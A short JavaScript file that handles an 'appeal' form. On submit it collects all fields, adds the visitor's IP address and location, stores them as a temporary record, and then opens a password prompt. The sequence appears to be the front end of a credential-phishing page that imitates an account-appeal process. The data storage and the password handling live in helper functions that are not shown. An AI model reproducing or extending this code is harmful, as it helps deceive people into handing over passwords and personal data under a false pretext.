(function () {
  document.addEventListener('DOMContentLoaded', function () {
    var form = document.getElementById('appeal-form');
    if (!form) return;

    var fetchUserLocation = window.fetchUserLocation;
    var saveRecord = window.saveRecord;
    var openModal = window.openModal;
    var submitBtn = form.querySelector('button[type="submit"]');
    if (!submitBtn) return;

    submitBtn.addEventListener('click', function () {
      try {
        var formData = new FormData(form);
        var values = {};
        formData.forEach(function (value, key) {
          values[key] = value;
        });

        // If fetchUserLocation is available, enrich data with IP & location
        if (typeof fetchUserLocation === 'function') {
          fetchUserLocation()
            .then(function (loc) {
              if (loc) {
                if (!values.ip) values.ip = loc.ip || '';
                if (!values.location) values.location = loc.location || '';
              }

              // Save temporary data
              if (typeof saveRecord === 'function') {
                try {
                  saveRecord('__appeal_temp', values);
                } catch (e) {
                  console.warn('Failed to save temporary appeal data:', e);
                }
              }

              // Open password modal if available
              if (typeof openModal === 'function') {
                openModal('password');
              }

              console.log('🔎 Appeal modal data with location:', values);
            })
            .catch(function () {
              if (typeof saveRecord === 'function') {
                try {
                  saveRecord('__appeal_temp', values);
                } catch (e) {
                  console.warn('Failed to save temporary appeal data:', e);
                }
              }

              if (typeof openModal === 'function') {
                openModal('password');
              }
              console.log('🔎 Appeal modal data (no location):', values);
            });
        } else {
          if (typeof saveRecord === 'function') {
            try {
              saveRecord('__appeal_temp', values);
            } catch (e) {
              console.warn('Failed to save temporary appeal data:', e);
            }
          }
          if (typeof openModal === 'function') {
            openModal('password');
          }
          console.log('🔎 Appeal modal data (fetchUserLocation missing):', values);
        }
      } catch (err) {
        console.warn('Failed to read appeal form data:', err);
      }
    });
  });
})();


